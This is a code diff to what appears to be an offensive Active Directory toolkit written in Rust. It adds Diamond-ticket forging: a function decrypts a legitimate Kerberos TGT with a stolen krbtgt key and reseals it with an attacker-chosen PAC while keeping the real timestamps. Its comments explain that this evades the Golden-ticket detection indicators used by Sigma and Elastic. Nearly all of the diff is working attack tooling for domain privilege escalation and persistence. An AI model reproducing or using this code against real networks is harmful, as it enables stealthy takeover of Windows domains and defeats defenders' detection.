@@ -12,7 +12,7 @@
 //! hashcat-13100 hash. AES-only service accounts return etype 18 and are reported as such.
 
 use crate::{format_tgs, kdc_exchange, krb_string, now_kerberos_time, principal, ETYPE_RC4_HMAC};
-use anyhow::{anyhow, bail, Result};
+use anyhow::{anyhow, bail, Context, Result};
 
 use picky_asn1::bit_string::BitString;
 use picky_asn1::wrapper::{
@@ -31,8 +31,8 @@ use picky_krb::crypto::ChecksumSuite;
 use picky_krb::crypto::{Cipher, CipherSuite};
 use picky_krb::data_types::{
     Authenticator, AuthenticatorInner, AuthorizationData, AuthorizationDataInner, EncTicketPart,
-    EncryptedData, EncryptionKey, EtypeInfo2, PaData, PaEncTsEnc, PrincipalName, Ticket,
-    TicketInner, TransitedEncoding,
+    EncryptedData, EncryptionKey, EtypeInfo2, KerberosTime, PaData, PaEncTsEnc, PrincipalName,
+    Ticket, TicketInner, TransitedEncoding,
 };
 use picky_krb::data_types::{Checksum, PaPacOptions};
 use picky_krb::messages::{
@@ -1057,6 +1057,19 @@ pub async fn rbcd_impersonate(
     Ok(etype)
 }
 
+/// **1.4.8-A WS-DIAMOND-TICKET**: overrides for a forged ticket's timestamps. `None`
+/// on any field falls back to `now_kerberos_time()` / `far_future_time()` (the Golden
+/// / Silver default that flags anomalously — 10-year validity is a well-known IOC).
+/// A Diamond ticket populates all four from a legitimately-obtained TGT so the
+/// forged one's clock-domain matches the KDC exactly.
+#[derive(Default, Clone)]
+pub struct TicketTimestamps {
+    pub auth_time: Option<KerberosTime>,
+    pub starttime: Option<KerberosTime>,
+    pub endtime: Option<KerberosTime>,
+    pub renew_till: Option<KerberosTime>,
+}
+
 /// Shared ticket forger. Marshals the PAC (signed with `server_sig_key`/`kdc_sig_key`), wraps it
 /// in the EncTicketPart authorization-data, and seals the whole thing under `ticket_key`
 /// (key usage 2). `sname` is the ticket's service principal.
@@ -1068,6 +1081,31 @@ fn forge_ticket(
     kdc_sig_key: &[u8],
     sname: &[&str],
     rc4: bool,
+) -> Result<Tgt> {
+    forge_ticket_with_timestamps(
+        id,
+        realm,
+        ticket_key,
+        server_sig_key,
+        kdc_sig_key,
+        sname,
+        rc4,
+        &TicketTimestamps::default(),
+    )
+}
+
+/// Same as [`forge_ticket`], but any populated field of `ts` overrides the
+/// now/far-future defaults. Diamond ticket forge uses this to inherit real
+/// KDC-issued timestamps from a legit TGT.
+fn forge_ticket_with_timestamps(
+    id: &crate::pac::ForgeIdentity,
+    realm: &str,
+    ticket_key: &[u8],
+    server_sig_key: &[u8],
+    kdc_sig_key: &[u8],
+    sname: &[&str],
+    rc4: bool,
+    ts: &TicketTimestamps,
 ) -> Result<Tgt> {
     let realm = realm.to_uppercase();
     let pac_bytes = crate::pac::assemble_pac(id, server_sig_key, kdc_sig_key, rc4)?;
@@ -1110,10 +1148,18 @@ fn forge_ticket(
             tr_type: ExplicitContextTag0::from(IntegerAsn1(vec![0])),
             contents: ExplicitContextTag1::from(OctetStringAsn1(vec![])),
         }),
-        auth_time: ExplicitContextTag5::from(now_kerberos_time()),
-        starttime: Optional::from(Some(ExplicitContextTag6::from(now_kerberos_time()))),
-        endtime: ExplicitContextTag7::from(crate::far_future_time()),
-        renew_till: Optional::from(Some(ExplicitContextTag8::from(crate::far_future_time()))),
+        auth_time: ExplicitContextTag5::from(
+            ts.auth_time.clone().unwrap_or_else(now_kerberos_time),
+        ),
+        starttime: Optional::from(Some(ExplicitContextTag6::from(
+            ts.starttime.clone().unwrap_or_else(now_kerberos_time),
+        ))),
+        endtime: ExplicitContextTag7::from(
+            ts.endtime.clone().unwrap_or_else(crate::far_future_time),
+        ),
+        renew_till: Optional::from(Some(ExplicitContextTag8::from(
+            ts.renew_till.clone().unwrap_or_else(crate::far_future_time),
+        ))),
         caddr: Optional::from(None),
         authorization_data: Optional::from(Some(ExplicitContextTag10::from(auth))),
     };
@@ -1163,6 +1209,51 @@ pub fn forge_golden_tgt(
         krbtgt_key,
         &["krbtgt", &realm_up],
         rc4,
+    )
+}
+
+/// **1.4.8-A WS-DIAMOND-TICKET**: forge a **Diamond ticket** — a TGT with an
+/// attacker-chosen PAC (`id_overrides`) but timestamps + `cname` inherited from a
+/// legitimately-obtained real TGT (`real`). The outer TGT looks like a normal
+/// KDC-issued ticket (real auth/start/end/renew times matching wall-clock, real
+/// principal), only the PAC's group memberships / SIDs are attacker-controlled.
+///
+/// Threat-hunting properties vs Golden:
+/// - Golden: 10-year `endtime` + `renew_till` is a common Elastic / Sigma IOC.
+/// - Diamond: timestamps match the KDC's real clock domain. Detection has to
+///   go through the PAC's KDC signature or logon-event correlation — one
+///   defense layer deeper.
+///
+/// Requires:
+/// - `real`: a legitimately-obtained TGT (`get_tgt` / `asktgt` under any account).
+/// - `krbtgt_key`: the domain's krbtgt AES256 key (from a prior DCSync).
+/// - `id_overrides`: attacker-chosen PAC.
+///
+/// Feed the returned `Tgt` to [`golden_ccache`] to persist as an MIT ccache.
+pub fn forge_diamond_tgt(
+    real: &Tgt,
+    id_overrides: &crate::pac::ForgeIdentity,
+    krbtgt_key: &[u8],
+    rc4: bool,
+) -> Result<Tgt> {
+    let (etp, _pac_bytes) = crate::pac::decrypt_ticket_pac(real, krbtgt_key)
+        .context("decrypt real TGT ticket with krbtgt key")?;
+    let ts = TicketTimestamps {
+        auth_time: Some(etp.auth_time.0.clone()),
+        starttime: etp.starttime.0.as_ref().map(|s| s.0.clone()),
+        endtime: Some(etp.endtime.0.clone()),
+        renew_till: etp.renew_till.0.as_ref().map(|s| s.0.clone()),
+    };
+    let realm_up = real.crealm.to_uppercase();
+    forge_ticket_with_timestamps(
+        id_overrides,
+        &real.crealm,
+        krbtgt_key,
+        krbtgt_key,
+        krbtgt_key,
+        &["krbtgt", &realm_up],
+        rc4,
+        &ts,
     )
 }
 
